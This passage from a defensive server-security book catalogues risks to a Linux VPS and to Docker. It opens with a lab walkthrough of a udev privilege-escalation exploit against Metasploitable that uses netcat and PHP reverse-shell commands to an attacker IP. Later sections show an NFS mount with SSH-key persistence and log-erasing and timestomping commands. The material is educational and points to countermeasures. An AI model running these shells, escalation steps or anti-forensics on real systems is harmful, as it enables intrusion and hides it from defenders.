G> This ([https://www.exploit-db.com/exploits/8572/](https://www.exploit-db.com/exploits/8572/)) looks like an interesting target. Can we compile this on the target though? Do we have `gcc` handy:  
G> `dpkg -l gcc`  
G> We do.

{icon=bomb}
G>
G> udev is a device manager running as root for the Linux kernel. Before version 1.4.1 it did not verify whether a netlink message originated from the kernel or user space,  
G> which allowed users to supply their own, as seen in the exploit:  
G> `sendmsg(sock, &msg, 0);`
G>
G> This exploit will run the payload that we will create momentarily, which will open a reverse root shell (because udev is running as root) back to our attacking box.  
G> We need to pass the PID of the netlink socket as an argument.  
G> When a device is removed, the exploit leverages the `95-udev-late.rules` functionality, which runs arbitrary commands (which we are about to create in `/tmp/run`) via the `REMOVE_CMD` in the exploit.  
G> You can also see within the exploit that it adds executable permissions to our reverse shell payload. If only we had `/tmp` mounted as we do in the `/etc/fstab` in the Countermeasures section, neither `/tmp/run` or `/tmp/privesc` would be able to execute.  
G>
G> Through our daemon shell that `distcc_exec` provided, let's fetch the exploit:  
G> `wget --no-check-certificate https://www.exploit-db.com/download/8572 -O privesc.c`  
G> The `no-check` is required because Metasploitable does not have the relevant CA cert installed.  
G> Now check that the file has the contents that you expect it to have.  
G> `cat privesc.c`
G>
G> Compile it:  
G> `gcc privesc.c -o privesc`  
G> `ls -liah`  
G> `privesc`
G>
G> We need the PID of the udevd netlink socket  
G> `cat /proc/net/netlink`  
G> gives us `2299`  
G> And to check:  
G> `ps -aux | grep udev`  
G> gives us `2300` which should be one more than netlink.
G>
G> We need something on the target to use to open a reverse shell. Netcat may not be available on a production web server, but if it is:  
G> Open a connection to 192.168.0.12:1234, then run `/bin/bash`  
G> `echo '#!/bin/bash' > run`  
G> `echo '/bin/netcat -e /bin/bash 192.168.0.12 1234' >> run`  
G> Another alternative is using php  
G> `echo '#!/bin/bash' > run`  
G> `echo "php -r '\$sock=fsockopen(\"192.168.0.12\",1234);exec(\"/bin/bash <&3 >&3 2>&3\");'" >> run`  
G> There are also many other options [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to use for providing a reverse shell.

{icon=bomb}
G>
G> On the attacking side:  
G> `nc -lvp 1234`  
G> `Listening on [any] 1234 ...`
G>
G> Now from our low privilege shell, user supplies message from user space (seen within the exploit) along with the PID of netlink:  
G> `./privesc 2299`
G>
G> You should see movement on the listening netcat now.  
G> `connect to [192.168.0.12] from metasploitable [192.168.0.232] 43542`  
G> `whoami`  
G> `root`
G>
G> That is our privilege escalation, we now have root.

The Countermeasures sections that address this are:

1. [Partitioning on OS Installation](#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation)
2. [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions), which also briefly touches on the improving file permissions and ownership

#### Weak Password Strategies
![](images/ThreatTags/difficult-common-average-severe.png)

This same concept was covered in the People chapter of Fascicle 0, which also applies to VPS. In addition, the risks are addressed within the [countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section.

#### Root Logins
![](images/ThreatTags/average-common-average-severe.png)

Allowing root logins is another lost layer of defence in depth, where the user must elevate privileges before performing any task that could adversely affect the system. Once an attacker is root on a system, the system is owned, plain and simple. Root is a user after all, and no guess work is required to take full advantage. Other low privileged users require some guess work on the part of the username, as well as the password. Even once both parts of a low privileged credential have been acquired, there is another step to total system ownership (escalation).

#### SSH
![](images/ThreatTags/difficult-uncommon-average-moderate.png)

You may remember we did some fingerprinting of the SSH daemon in the Reconnaissance section of the Processes and Practises chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). SSH, in and of itself, has been proven to be solid. In saying that, SSH is only as strong as the weakest link involved. For example, if you are using password authentication as default, and have not configured which remote hosts are allowed to access the server, and have used a weak password, then your SSH security is only as strong as that password. There are many configurations that a default SSH installation uses in order to get up and running quickly, but they need to be modified in order to harden the SSH daemon. Using SSH in this manner can be convenient initially, but it is always recommended to move from defaults to a more secure implementation. I cover many techniques for configuring and hardening SSH in the [SSH Countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh) section.

#### Too Many Boot Options
![](images/ThreatTags/difficult-uncommon-difficult-severe.png)

The ability to boot from alternative media to your installed OS provides additional opportunity for an attacker to install a root-kit on your system, whether it be virtual, or real media.

#### Portmap {#vps-identify-risks-unnecessary-and-vulnerable-services-portmap}
![](images/ThreatTags/easy-common-easy-moderate.png)

An attacker can probe the Open Network Computing Remote Procedure Call (ONC RPC) port mapper service on the target host via an IP address or a host name.

If installed, the `rpcinfo` command with `-p` will list all RPC programs (such as `quotad`, `nfs`, `nlockmgr`, `mountd`, `status`, etc) registered with the port mapper (whether the deprecated `portmap` or the newer `rpcbind`). Many RPC programs are vulnerable to a variety of attacks. 

{title="rpcinfo", linenos=off, lang=bash}
    rpcinfo -p <target host> 

{title="rpcinfo results for Metasploitable2", linenos=off, lang=bash}
    program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100000    4     7    111  portmapper
    100000    3     7    111  portmapper
    100000    2     7    111  portmapper
    100005    1   udp    649  mountd
    100003    2   udp   2049  nfs
    100005    3   udp    649  mountd
    100003    3   udp   2049  nfs
    100024    1   udp    600  status
    100005    1   tcp    649  mountd
    100024    1   tcp    868  status
    100005    3   tcp    649  mountd
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100021    0   udp    679  nlockmgr
    100021    0   tcp    875  nlockmgr
    100021    1   udp    679  nlockmgr
    100021    1   tcp    875  nlockmgr
    100021    3   udp    679  nlockmgr
    100021    3   tcp    875  nlockmgr
    100021    4   udp    679  nlockmgr
    100021    4   tcp    875  nlockmgr

This provides a list of RPC services running that have been registered with the port mapper, thus providing an attacker with a lot of useful information to use in the Vulnerability Searching stage as discussed in the Process and Practises chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com).

The deprecated `portmap` service, as well as the newer `rpcbind`, listen on port 111 for requesting clients, some Unix and Solaris versions will also listen on ports above 32770.

In addition to providing the details of RPC services, `portmap` and `rpcbind` are inherently vulnerable to DoS attacks, specifically reflection and amplification attacks. Clients make a request and the port mapper will respond with all the RPC servers that have registered with it, thus the response is many times larger than the request. This serves as an excellent vector for DoS, saturating the network with amplified responses.

These types of attacks have become very popular amongst distributed attackers due to their significant impact, as well as a lack of sophistication and ease of execution. Level 3 Threat Research Labs published a [blog post](http://blog.level3.com/security/a-new-ddos-reflection-attack-portmapper-an-early-warning-to-the-industry/) on this port mapper DoS attack, and it's popularity as of August 2015.  
US-CERT also published an [alert](https://www.us-cert.gov/ncas/alerts/TA14-017A) on UDP-Based Amplification Attacks outlining the Protocols, Bandwidth Amplification Factor, etc.

{title="rpcinfo", linenos=off, lang=bash, id=vps-identify-risks-unnecessary-and-vulnerable-services-portmap-rpcinfo-t}
    rpcinfo -T udp <target host> 

{title="rpcinfo results for Metasploitable2", linenos=off, lang=bash}
    program version netid     address                service    owner
    100000    2    tcp       0.0.0.0.0.111          portmapper unknown
    100024    1    udp       0.0.0.0.130.255        status     unknown
    100024    1    tcp       0.0.0.0.138.110        status     unknown
    100003    2    udp       0.0.0.0.8.1            nfs        unknown
    100003    3    udp       0.0.0.0.8.1            nfs        unknown
    100003    4    udp       0.0.0.0.8.1            nfs        unknown
    100021    1    udp       0.0.0.0.167.198        nlockmgr   unknown
    100021    3    udp       0.0.0.0.167.198        nlockmgr   unknown
    100021    4    udp       0.0.0.0.167.198        nlockmgr   unknown
    100003    2    tcp       0.0.0.0.8.1            nfs        unknown
    100003    3    tcp       0.0.0.0.8.1            nfs        unknown
    100003    4    tcp       0.0.0.0.8.1            nfs        unknown
    100021    1    tcp       0.0.0.0.151.235        nlockmgr   unknown
    100021    3    tcp       0.0.0.0.151.235        nlockmgr   unknown
    100021    4    tcp       0.0.0.0.151.235        nlockmgr   unknown
    100005    1    udp       0.0.0.0.235.25         mountd     unknown
    100005    1    tcp       0.0.0.0.182.4          mountd     unknown
    100005    2    udp       0.0.0.0.235.25         mountd     unknown
    100005    2    tcp       0.0.0.0.182.4          mountd     unknown
    100005    3    udp       0.0.0.0.235.25         mountd     unknown
    100005    3    tcp       0.0.0.0.182.4          mountd     unknown
    100000    2    udp       0.0.0.0.0.111          portmapper unknown

You will notice in the response, as recorded by Wireshark, that the length is many times larger than the request, 726 bytes in this case, hence the reflected amplification:

{title="Wireshark results", linenos=off, lang=bash}
    Source      Destination Protocol Length Info
    <source IP> <dest IP>   Portmap  82     V3 DUMP Call (Reply In 76)
    <dest IP>   <source IP> Portmap  726    V3 DUMP Reply (Call In 75)

The packet capture in Wireshark which is not shown here also confirms that it is UDP.

#### EXIM
![](images/ThreatTags/difficult-uncommon-difficult-moderate.png)

Exim, along with other offerings such as Postfix, Sendmail, Qmail, etc., are Mail Transfer Agents (MTAs) which, on a web server, are probably not required.

There have been plenty of exploits created for Exim security defects. Most of these defects are patched, so if Exim is a necessity, stay up to date. If you are still on a stable build (jessie at the time of writing) and can not update to a testing release, make sure to use backports.

At the time of this writing, the front page of the [Exim website](www.exim.org) states that "All versions of Exim previous to version 4.87 are now obsolete ..." Therefore, Exim strongly recommends everyone upgrades to a current release.

Jessie (stable) uses Exim 4.84.2 where as jessie-backports uses Exim 4.87.  
Exim 4.86.2 was patched for the likes of [CVE-2016-1531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1531). If we have a look at the first exploit for this vulnerability ([https://www.exploit-db.com/exploits/39535/](https://www.exploit-db.com/exploits/39535/)), and dissect it a little:

The Perl shell environment variable `$PERL5OPT` can be assigned  options, these options will be interpreted as if they were on the `#!` line at the beginning of the script and treated as part of the command run, after any optional switches included on the command line are accepted. 

`-M`, which is one of the allowed switches (`-`[`DIMUdmw`]) to be used with `$PERL5OPT` allows us to attempt to use a module from the command line, with `-Mroot` we are trying to use the `root` module, then `PERL5OPT=-Mroot` effectively puts `-Mroot` on the first line as follows, which runs the script as root:

`#!perl -Mroot` 

The Perl shell environment variable `$PERL5LIB` is used to specify a colon (or semicolon on Windows) separated list of directories in which to look for in Perl library files before looking in the standard library and the current directory.

Assigning `/tmp` to `$PERL5LIB` immediately before the exploit is run causes the first execution for the root module to occur from the `/tmp` directory.

#### NIS {#vps-identify-risks-unnecessary-and-vulnerable-services-nis}
![](images/ThreatTags/difficult-uncommon-difficult-moderate.png)

**Some History**:

NIS+ was introduced as part of Solaris 2 in 1992 with the intention of replacing Network Information Service (NIS) and was originally known as Yellow Pages (YP). NIS+ featured stronger security, authentication, greater scalability and flexibility, though it was more difficult to set up, administer and migrate to, so many users stuck with NIS. NIS+ was removed from Solaris 11 at the end of 2012. Other more secure distributed directory systems such as Lightweight Directory Access Protocol (LDAP) have replaced NIS(+).

**What NIS is**:

NIS is a Remote Procedure CAll (RPC) client/server system and a protocol providing a directory service which lets many networked machines share a common set of configuration files with the same account information, such as the commonly local stored UNIX:

* users
* their groups
* hostnames
* e-mail aliases
* etc
* and contents of the `/etc/passwd` and referenced `/etc/shadow` which contains the hashed passwords, discussed in detail under the [Review Password Strategies](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section

The NIS master server maintains canonical database files called maps. There are also slave servers which have copies of these maps. Slave servers are notified by the master via the `yppush` program when any changes to the maps have occurred. The slaves then retrieve the changes from the master in order to synchronise their own maps. The NIS clients always communicate directly with the master, or a slave if the master is down or slow. Both master and slave(s) service all client requests through `ypserv`.

**Vulnerabilities and exploits**:

NIS has had its day because it is vulnerable to many exploits, such as DoS attacks using the finger service against multiple clients, buffer overflows in libnasl, 

"_lax authentication while querying of NIS maps (easy for a compromised client to take advantage of), as well as the various daemons each having their own individual issues. Not to mention that misconfiguration of NIS or netgroups can also provide easy holes that can be exploited. NIS databases can also be easily accessed by someone who doesn't belong on your network. How? They simply can guess the name of your NIS domain, bind their client to that domain, and run a ypcat command to get the information they are after._"

> [Symantec - nfs and nis security](https://www.symantec.com/connect/articles/nfs-and-nis-security)

NIS can run on unprivileged ports, which means that any user on the system(s) can run them. If a replacement version of these daemons was put in place of the original, then the attacker would have access to the resources that the daemons control.

#### Rpcbind
![](images/ThreatTags/easy-widespread-average-moderate.png)

`rpcbind` listens on the same port(s) as the deprecated [`portmap`](#vps-identify-risks-unnecessary-and-vulnerable-services-portmap) and suffers the same types of DoS attacks.

#### Telnet {#vps-identify-risks-unnecessary-and-vulnerable-services-telnet}
![](images/ThreatTags/easy-widespread-average-moderate.png)

Provides a command line interface on a remote server via its application layer client-server protocol traditionally to port 23. Telnet was created and launched in 1969, and provides no encryption, its credentials are sent in plain text. There have been extensions added to the Telnet protocol which provide Transport Layer Security (TLS) and Simple Authentication and Security Layer (SASL), however many Telnet implementations do not support these.

Telnet is still often enabled by default on many cheap hardware appliances, which continue to provide an excellent source of own-ability for those looking to acquire computing devices illegally in order to launch attacks. Many of these devices have also never had their default credentials changed.

#### FTP
![](images/ThreatTags/easy-widespread-average-moderate.png)

The FTP protocol was [not designed with security in mind](https://archive.fo/KyJUa), it does not use any form of encryption. The credentials you use to authenticate all of your traffic including any sensitive information you have in the files you send or receive, to and from the FTP server, will all be on the wire in plain text. Even if you think your files do not contain any sensitive information, often there will still be details hiding within, for example, if you are `[m]put`ting / `[m]get`ing source files, there could be database credentials or other useful bits of information in config files.

Many people have been using FTP for years and in many cases have never considered the fact that FTP adds no privacy to anything it touches.

Also, most FTP clients store user credentials in plain text, this completely violates the principle of defence in depth. It should be considered that your client's machine is already compromised. If credentials are stored encrypted, then it is one more challenge the attacker must conquer. All software created with security in mind realises this, and, if they must store credentials, they will be hashed via a best of breed KDF (as discussed in the [Data-store Compromise](#web-applications-countermeasures-data-store-compromise) section of the Web Applications chapter) with the recommended number of iterations (as discussed in the [Review Password Strategies](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section a little later in this chapter). Regarding FTP, clients are designed to store multiple credentials, one set for each site. For the convenience of not having to remember them, they need to be encrypted, rather than hashed (one way, not reversible), so they can be decrypted.

A couple of the most popular clients are:

**FileZilla** (cross platform) FTP client stores your credentials in plain text. Yes, the UI conceals your password from shoulder surfers, but that is the extent of its security, equating to none.

**WinSCP** (Windows) is an FTP, [SFTP](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-sftp) and [SCP](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-scp) client for Windows. WinSCP includes a number of ways in which you can manage passwords. [By default](https://winscp.net/eng/docs/security_credentials), when a user enters their password in the authentication window, it is stored in memory, and reused for all subsequent authentications during the same session. This subjects credentials to memory enumeration exploitation, in-memory data can be swapped to disk, written to crash dump files and accessed by malware.

Another option is to store passwords along with other site specific configurations to the registry for installed instances of WinSCP, or to an INI file (can be overridden) for the portable version. These passwords are stored obfuscated, as the documentation puts it "[_stored in a manner that they can easily be recovered_](https://winscp.net/eng/docs/security_credentials)". If you are interested, you can check the `EncryptPassword` function on the WinSCP [GitHub](https://github.com/mirror/winscp/blob/master/source/core/Security.cpp#L34) mirror, in which a short and simple set of bitwise operations are performed on each character of the password, and the user and host are concatenated for what looks to be some sort of pseudo-salt. Although this option exists, it is [not recommended](https://winscp.net/eng/docs/faq_password).

Here is why. The [exploit](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/parser/winscp.rb#L81) `decrypt_password` is consumed by the [`winscp`](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/winscp.rb#L82) [metasploit module](https://www.rapid7.com/db/modules/post/windows/gather/credentials/winscp). See additional details on the [cosine-security blog](https://cosine-security.blogspot.co.nz/2011/04/stealing-winscp-saved-passwords.html).

The recommended way to store site-specific passwords is to use a Master Password. This appears to use a [custom implementation](https://github.com/mirror/winscp/blob/master/source/core/Cryptography.cpp) of the AES256 block cipher, with a hard-coded 1000 rounds of SHA1.

WinSCP provides a lot of options, if configured properly it can be securely implemented, but it can also be left quite vulnerable.

#### NFS
![](images/ThreatTags/average-uncommon-average-moderate.png)

`mountd` or `rpc.mount` is the NFS mount daemon, that listens and services NFS client requests to mount a file system.

If mounts are listed in the `/etc/fstab`, attempts will be made to mount them on system boot.

If the `mountd` daemon is listed in the output of the above `rpcinfo` command, the `showmount -e` command will be useful for listing the NFS servers list of exports defined in the servers `/etc/exports` file.

{title="showmount", linenos=off, lang=bash}
    showmount -e <target host>

{title="showmount results", linenos=off, lang=bash}
    Export list for <target hsot>:
    / (anonymous) # If you're lucky as an attacker, anonymous means anyone can mount.
    / * # means all can mount the exported root directory.
    # Likely because the hosts.allow has ALL:ALL and hosts.deny is blank.
    # Which translates to all hosts from all domains are permitted access.

NFS is one of those protocols that you need to have some understanding of in order to achieve a level of security sufficient for your target environment. NFS provides no user authentication, only host based authentication. NFS relies on the AUTH_UNIX method of authentication, the user ID (UID) and group ID (GIDs) that the NFS client passes to the server are implicitly trusted.

{title="mount nfs export", linenos=off, lang=bash}
    # Make sure local rpcbind service is running:
    service rpcbind status
    # Should yield [ ok ] rpcbind is running.
    # If not:
    service rpcbind start
    mount -t nfs <target host>:/ /mnt

If all goes well for the attacker, they will now have your VPS's `/` directory mounted to their `/mnt` directory. If you have not setup NFS properly, they will have full access to your entire file system.

To establish some persistence, an attacker may be able to add their SSH public key:

{linenos=off, lang=bash}
    cat ~/.ssh/id_rsa.pub >> /mnt/root/.ssh/authorized_keys

The NFS daemon always listens on the unprivileged port 2049. An attacker without root privileges on a system can start a trojanised `nfsd` which will be bound to port 2049.

* On a system that does not usually offer NFS, the attacker could then proceed to create a spear phishing attack, in which they convince the target to open a PDF or similar from the exported filesystem, or even use a fake ([pickled](https://github.com/micheloosterhof/cowrie/blob/master/data/fs.pickle)) filesystem. As the export(s) would probably be on an internal network, target trust levels would be very high, or...
* If they can find a way to stop an existing `nfsd` and run their own daemon, clients may communicate with the trojanised `nfsd` and possibly consume similar exports. By replacing an NFS daemon with a trojanised replica, the attacker would also have access to the resources that the legitimate daemon controls.

The ports that a Linux server will bind its daemons to are listed in `/etc/services`.

In addition to various privilege escalation vulnerabilities, NFS has also suffered from various buffer overflow vulnerabilities.

### Lack of Visibility {#vps-identify-risks-lack-of-visibility}
![](images/ThreatTags/average-common-difficult-moderate.png)

As I was writing this section, I realised that visibility for the defender is itself an asset, so I went back and added it to several chapters. Without the worry of being observed, an attacker can do a lot more damage than they could if you were watching them and able to react, or even if you have good auditing capabilities. It is in fact an asset that attackers try deny defenders of and remove for this very reason.

Any attacker worth their weight will try to [cover their tracks](https://www.win.tue.nl/~aeb/linux/hh/hh-13.html) as they progress. Once an attacker has shell access to a system, they may:

* Check running processes to make sure that they have not left anything they used to gain access still running
* Remove messages in logs related to their break (walk) in
* Alter or remove the shell history file. Or even:  
  `ln /dev/null ~/.bash_history -sf` so that all following history vanishes.
* They may change time stamps on new files with:  
  `touch -r <referenceFile> <fileThatGetsReferenceFileTimeStampsApplied>`  
  Or they may use the original date-time:

    {linenos=off}
        touch -r <originalFile> <trojanFile>
        mv <trojanFile> <originalFile>

* Make sure any trojan files they drop are the same size as the originals
* Replace `md5sum` so that it contains sums for the files that were replaced, including `md5sum` itself. However, if an administrator ran `rpm -V` or `debsums -c` (Debian, Ubuntu) it would not be affected by a modified `md5sum`.

If an attacker wants their actions to be invisible, they may try replacing the likes of `ps`, `pstree`, `top`, `ls`, `netstat` or `ss`, and/or many other tools that reveal information about the system, particularly if they are trying to hide network activity from the host.

Taking things a step further, an attacker may load a kernel module that modifies the `readdir()` call and the `proc` file system so that any changes on the file system are untrustworthy. If they go so far as to load custom modules, everything can be done from kernel space, which is invisible until reboot.

Without defender visibility, an attacker can access your system(s) and, alter, [copy](https://github.com/m57/dnsteal), and/or modify information without you knowing they did so. They may even launch DoS attacks without you noticing anything before it is to late.

### Docker {#vps-identify-risks-docker}

With the continual push for shorter development cycles, combined with continuous delivery, as well as cloud and virtual based infrastructure, containers have become an important part of the continuous delivery pipeline. Docker has established itself as a top contender in this space.

Many of Docker's defaults favour ease of use over security, in saying that, Docker's security considerations follow closely. After working with Docker, the research I have performed in writing these sections on Docker security, while having the chance to [discuss](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) many of my concerns and ideas with the Docker Security team lead, Diogo Mónica, it is my belief that, by default, Docker containers, infrastructure and orchestration provide better security than running your applications in Virtual Machines (VMs). Just be careful when comparing containers with VMs, as this is analogous with comparing apples to oranges.

Docker security provides immense configurability to improve its security posture many times over better than defaults. In order to do this properly, you will have to invest some time and effort into learning about the possible issues, features, and how to configure them. I have attempted to illuminate this specifically in these sections on Docker security.

Docker security is similar to VPS security, except that there is a much larger attack surface. This is most noteworthy when running many containers with different packages, many of which do not receive timely security updates, as noted by [banyan](https://www.banyanops.com/blog/analyzing-docker-hub/) and [the morning paper](https://blog.acolyer.org/2017/04/03/a-study-of-security-vulnerabilities-on-docker-hub/).

A monolithic kernel, such as the Linux kernel, which contains tens of millions of lines of code, and can be reached by untrusted applications via all sorts of networking, USB, and driver APIs, has a huge attack surface. Adding Docker into the mix has the potential to expose all these vulnerabilities to each and every running container, and its applications within, thus making the attack surface of the kernel grow exponentially.

Docker leverage's many features that have been in the Linux kernel for years, and provides many security enhancements out of the box. The Docker Security Team are working hard to add additional tooling and techniques to further harden their components. This has become obvious as I have investigated many of them. You will still need to know what all the features, tooling and techniques are, and how to use them, in order to determine whether your container security is adequate for your needs.

From the [Docker overview](https://docs.docker.com/engine/docker-overview/), it states: “_Docker provides the ability to package and run an application in a loosely isolated environment_”. Later in the same document it says: "_Each container is an isolated and secure application platform, but can be given access to resources running in a different host or container_" leaving the "loosely" out. It continues to say: “_Encapsulate your applications (and supporting components) into Docker containers_”. The meaning of encapsulate is to enclose, but if we are only loosely isolating, then we're not really enclosing are we? I will address this concern in the following Docker sections and subsections.

To begin with, I am going to discuss many areas where we can improve container security. At the end of this Docker section I will discuss why application security is of far more concern than container security.

#### Consumption from [Registries](https://docs.docker.com/registry/)
![](images/ThreatTags/average-verywidespread-easy-moderate.png)

Similar to [Consuming Free and Open Source](#web-applications-identify-risks-consuming-free-and-open-source) from the Web Applications chapter, many of us trust the images on Docker hub without considering possibly defective packages within. There have been quite a few reports with varying numbers of vulnerable images as noted by Banyan and "the morning paper" mentioned above.

The Docker Registry [project](https://github.com/docker/distribution) is an open-source server side application that lets you store and distribute Docker images. You could run your own registry as part of your organisation's Continuous Integration (CI) / Continuous Delivery (CD) pipeline. Some of the public known instances of the registry are:

* [Docker Hub](https://hub.docker.com/explore/)
* EC2 Container Registry
* Google Container Registry
* CoreOS quay.io

#### Doppelganger images
![](images/ThreatTags/average-common-average-severe.png)

Beware of doppelganger images that will be available for all to consume, similar to [doppelganger packages](#web-applications-countermeasures-consuming-free-and-open-source-keeping-safe-doppelganger-packages) that we discuss in the Web Applications chapter. These can contain a huge number of packages and code that can be used to hide malware in a Docker image.

#### The Default User is Root {#vps-identify-risks-docker-the-default-user-is-root}
![](images/ThreatTags/easy-common-veryeasy-moderate.png)

What is worse, Docker's default is to run containers, and all commands / processes within a container as root. This can be seen by running the following command from the [CIS_Docker_1.13.0_Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf):

{title="Query User running containers", linenos=off, lang=Bash}
    docker ps --quiet | xargs docker inspect --format '{{ .Id }}: User={{ .Config.User }}'

If you have two containers running, and the user has not been specified, you will see something similar to the below, which means your two containers are running as root.

{title="Result of user running containers output", linenos=off, lang=Bash}
    <container n Id>: User=
    <container n+1 Id>: User=

Images derived from other images inherit the same user defined in the parent image explicitly or implicitly, so unless the image creator has specifically defined a non-root user, the user will default to root. That means all processes within the container will run as root.

#### Docker Host, Engine and Containers
![](images/ThreatTags/difficult-uncommon-average-moderate.png)

Considering that these processes run as root, and have [indirect access](https://theinvisiblethings.blogspot.co.nz/2012/09/how-is-qubes-os-different-from.html) to most of the Linux Kernel (20+ million lines of code written by humans) APIs, such as networking, USB, storage stacks, and others via System calls, the situation may look bleak.

![](images/HypervisorVsContainers.png)

[System calls](http://man7.org/linux/man-pages/man2/syscalls.2.html) are how programmes access the kernel to perform tasks. This attack surface is huge, and before any security is added on top in the form of LXC, libcontainer (now [opencontainers/runc](https://github.com/opencontainers/runc)), or [Linux Security Modules (LSM)](#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules) such as AppArmor or SELinux. These are often seen as an annoyance and just disabled like many other forms of security.

If you run a container, you may have to install `kmod`, then run `lsmod` in the container, and also on the host system. You will see that the same modules are loaded, this is because as mentioned, the container shares the host kernel, so there is not a lot between processes within the container and the host kernel. As mentioned above, the processes within the container may be running as root as well, it pays for you to have a good understanding of the security features Docker provides, and how to employ them.

The [Seccomp section below](#vps-identify-risks-docker-docker-engine-and-containers-seccomp) discusses Docker's attempt to put a stop to some System calls accessing the kernel APIs. There are also many other features that Docker has added or leveraged in terms of mitigating a lot of this potential abuse. Although the situation initially looks bad, Docker has done a lot to improve it.

As you can see in the above image, the host kernel is open to receiving potential abuse from containers. Make sure you keep it patched. We will now walk though many areas of potential abuse. The [countermeasures](#vps-countermeasures-docker) sections offer information, advice, and techniques for further improving Docker security.

##### Namespaces {#vps-identify-risks-docker-docker-host-engine-and-containers-namespaces}

The first place to read for solid background on Linux kernel namespaces is the [man-page](http://man7.org/linux/man-pages/man7/namespaces.7.html), otherwise I'd just be repeating what is there. A lot of what follows about namespaces requires some knowledge from the namespaces man-page, so do yourself a favour and read it there first.

Linux kernel namespaces were first added between 2.6.15 (January 2006) and 2.6.26 (July 2008).

According to the namespaces man page, IPC, network and UTS namespace support was available from kernel version 3.0, while mount, PID and user namespace support was available from kernel version 3.8 (February 2013), and cgroup namespace support was available from kernel version 4.6 (May 2016).

Each aspect of a container runs in a separate namespace and its access is limited to that namespace.

Docker leverages the Linux (kernel) namespaces which provide an isolated workspace wrapped with a global system resource abstraction. This makes it appear to the processes within the namespace that they have their own isolated instance of the global resource. When a container is run, Docker creates a set of namespaces for that container, providing a layer of isolation between containers:

1. `mnt`: (Mount) Provides filesystem isolation by managing filesystems and mount points. The `mnt` namespace allows a container to have its own isolated set of mounted filesystems, the propagation modes can be one of the following: [`r`]`shared`, [`r`]`slave` or [`r`]`private`. The `r` means recursive.
    
    If you run the following command, then the host's mounted `host-path` is [shared](https://docs.docker.com/engine/admin/volumes/volumes/#create-and-manage-volumes) with all others that mount `host-path`. Any changes made to the mounted data will be propagated to those that use the `shared` mode propagation. Using `slave` means only the master (`host-path`) is able to propagate changes, not vice-versa. Using `private` which is the default, will ensure no changes can be propagated.
    
    {title="Mounting volumes in shared mode propagation", linenos=off, lang=bash}
        docker run <run arguments> --volume=[host-path:]<container-path>:[z][r]shared <container image name or id> <command> <args...>
    
    If you omit the `host-path` you can [see the host path](https://docs.docker.com/engine/tutorials/dockervolumes/#locating-a-volume) that was mounted when running the following command:
    
    {title="Query", linenos=off, lang=bash}
        docker inspect <name or id of container>
    
    Find the "Mounts" property in the JSON produced. It will have a "Source" and "Destination" similar to:
    
    {title="Result", linenos=off, lang=json}
        ...
        "Mounts": [
          {
            "Name": "<container id>",
            "Source": "/var/lib/docker/volumes/<container id>/_data",
            "Destination": "<container-path>",
            "Mode": "",
            "RW": true,
            "Propagation": "shared"
          }
        ]
        ...
    
    An empty string for Mode means that it is set to its read-write default. For example, a container can mount sensitive host system directories such as `/`, `/boot`, `/etc` (as seen in [Review Password Strategies](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies)), `/lib`, `/proc`, `/sys`, along with the rest as discussed in the [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section, particularly if that advice was not followed. If it was followed, you have some defence in depth working for you, and although Docker may have mounted a directory as read-write, the underlying mount may be read-only, which stops the container from being able to modify files in these locations on the host system. If the host does not have the above directories mounted with constrained permissions, then we are relying on the user running any given Docker container that mounts a sensitive host volume to mount it as read-only. For example, after the following command has been run, users within the container can modify files in the hosts `/etc` directory:
    
    {title="Vulnerable mount", linenos=off, lang=bash}
        docker run -it --rm -v /etc:/hosts-etc --name=lets-mount-etc ubuntu
    
    {title="Query", linenos=off, lang=bash}
        docker inspect -f "{{ json .Mounts }}" lets-mount-etc
    
    {title="Result", linenos=off, lang=bash}
        [
          {
            "Type":"volume",
            "Source":"/etc",
            "Destination":"/hosts-etc",
            "Mode":"",
            "RW":true,
            "Propagation":""
          }
        ]
    
    Also keep in mind that, by default, the user in the container, unless otherwise specified, is root, the same root user as on the host system.
    
    {#vps-identify-risks-docker-docker-host-engine-and-containers-namespaces-mnt-labelling}
    Labelling systems such as [Linux Security Modules (LSM)](#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules) require that the contents of a volume mounted into a container be [labelled](https://docs.docker.com/engine/admin/volumes/volumes/#create-and-manage-volumes). This can be done by adding the `z` (as seen in above example) or `Z` suffix to the volume mount. The `z` suffix instructs Docker to share the mounted volume with other containers, and in so doing, Docker applies a shared content label. Alternatively, if you provide the `Z` suffix, Docker applies a private unshared label, which means only the current container can use the mounted volume. Further details can be found at the [dockervolumes documentation](https://docs.docker.com/engine/admin/volumes/volumes/). This is something to keep in mind if you are using LSM, and have a process inside your container that is unable to use the mounted data.  
    `--volumes-from` allows you to specify a data volume from another container.
    
    You can also [mount](https://linux.die.net/man/8/mount) your Docker container mounts on the host by doing the following:
    
    {linenos=off, lang=bash}
        mount --bind /var/lib/docker/<volumes>/<container id>/_data </path/on/host>  
    
2. `PID`: (Process ID) Provides process isolation, separates container processes from host and other container processes.  
    
